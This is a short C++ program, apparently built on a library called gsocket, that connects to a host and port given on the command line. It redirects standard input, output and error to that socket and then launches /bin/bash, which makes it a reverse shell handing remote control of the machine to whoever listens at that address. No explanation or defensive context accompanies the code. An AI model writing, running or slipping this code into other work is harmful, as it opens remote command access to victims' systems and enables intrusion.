#include <gsocket/gsocket.hpp>

int main(int argc, const char **args)
{
  if(argc != 3)
  {
    std::cout << "Usage: " << args[0] << " host port\n";
    return -1;
  }
  const char *host = args[1];
  uint16_t port = std::strtol(args[2],nullptr,10);

  if(host == nullptr || port == 0){
    std::cerr << "host and port must be supplied\n";
    return -1;
  }

  gsocket::tcp4socket sock;
  if(sock.connect(host,port)){
    std::cerr << sockError << "\n"; return -1;
  };

  sock.duplicate(0);
  sock.duplicate(1);
  sock.duplicate(2);

  execve("/bin/bash", NULL, NULL);
  
  return 0;
}
